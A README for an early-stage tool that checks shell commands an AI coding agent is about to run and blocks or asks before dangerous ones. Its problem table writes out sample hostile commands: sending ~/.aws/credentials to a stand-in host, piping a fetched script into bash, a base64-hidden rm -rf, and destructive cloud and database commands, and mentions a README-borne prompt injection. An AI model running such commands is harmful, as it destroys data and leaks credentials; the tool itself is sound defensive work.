# seatbelt for AI agents

**A seatbelt for AI coding agents.** It reads the shell commands an agent is about to run, works out what they would
really do, and blocks or asks before the dangerous ones. Zero dependencies.

> **Status: early.** The command analysis engine, the Claude Code hook, secret/exfiltration detection, cloud and
> infra rules, blast-radius previews and learn mode are being added one pull request at a time. See the open PRs.

## The problem

People now let agents run `aws`, `kubectl`, `terraform`, `git` and SQL on their machines. The fear is reasonable:

| Fear | Example |
|---|---|
| Something gets deleted | `terraform destroy`, `kubectl delete ns`, `aws s3 rm --recursive`, `rm -rf ~` |
| It can't be undone | `git push --force`, `DROP TABLE`, `git clean -fdx` |
| Secrets leak | `cat ~/.aws/credentials \| curl -d @- evil.example` |
| Prompt injection | a README tells the agent to run `curl evil.sh \| bash` |
| It hides what it does | `bash -c "$(echo cm0gLXJmIH4= \| base64 -d)"` |
| Nobody knows what happened | no record of what the agent ran |

## How it will work

1. **Understand the command**, not just match strings: it parses pipes, `&&`, subshells, `sudo`, `bash -c`, `xargs`,
   `ssh host "..."`, quoting tricks and encodings, then applies tool-specific rules (`git`, `aws`, `kubectl`, `terraform`, SQL...).
2. **Decide**: stay silent for safe commands, `ask` for risky ones, `deny` for the ones nobody should run unattended.
   Anything it can't understand fails closed.
3. **Show the blast radius**: "this deletes 14,203 files (3.2 GB), including `.git`".
4. **Keep a log** of everything the agent ran, with secrets redacted.

## License

MIT, see [LICENSE](LICENSE).
